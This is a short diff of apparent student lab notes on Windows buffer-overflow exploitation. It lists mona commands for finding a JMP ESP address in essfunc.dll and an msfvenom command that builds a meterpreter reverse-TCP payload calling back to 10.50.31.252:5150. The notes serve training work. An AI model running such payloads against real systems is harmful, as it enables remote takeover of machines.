@@ -55,5 +55,5 @@
 !mona modules gave me .dll 
 !mona jmp -r esp -m "essfunc.dll"
 
-student@lin-ops:~/Windows_Demo$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.31.252 lport=5150 -b"x\00' -f python ----> PAYLOAD
+student@lin-ops:~/Windows_Demo$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.31.252 LPORT=5150 -b"x\00' -f python ----> PAYLOAD
 
